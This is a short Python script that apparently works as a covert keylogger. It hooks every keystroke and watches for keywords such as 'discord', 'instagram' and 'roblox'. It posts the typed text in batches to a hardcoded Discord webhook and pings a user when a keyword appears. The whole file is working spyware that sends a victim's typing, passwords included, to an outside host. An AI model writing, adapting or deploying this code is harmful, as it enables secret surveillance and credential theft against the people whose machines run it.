import string
import time
import requests
import threading
import keyboard

keywords = ["pbinfo", "discord", "instagram", "roblox"]
webhook = "https://discord.com/api/webhooks/1285585424571695106/PZVGPAfEFJsogemJVQJCP-XsQ-MISSING-pt7UeYz_pnHzeQ33Nlt57_w6vN1"

previous = ""
ggg = 1101225873924948069
def _format(keys: list[str]):
    global previous
    output = '`'
    for key in keys:
        if len(key) == 1:
            output += key
        elif key == "space":
            output += ' '
        else:
            output += f"<-{key}->"

    keywords_found = []
    for keyword in keywords:
        if keyword in previous + output:
            keywords_found.append(keyword)

    keywords_found = ', '.join(keywords_found)

    previous = output
    if len(keywords_found) != 0:
        output = f"<@{ggg}> found keywords `{keywords_found}`\n{output}"

    return output + '`'


queued_keys = []
def on_key_event(event):
    if event.event_type == keyboard.KEY_DOWN:
        queued_keys.append(event.name)


keyboard.hook(on_key_event)
while True:
    if len(queued_keys) > 20 or (len(queued_keys) > 0 and queued_keys[-1] == ' ' and not all(key == ' ' for key in queued_keys)):
        threading.Thread(target=requests.post, args=(webhook, {"content": _format(queued_keys)})).start()
        queued_keys = []
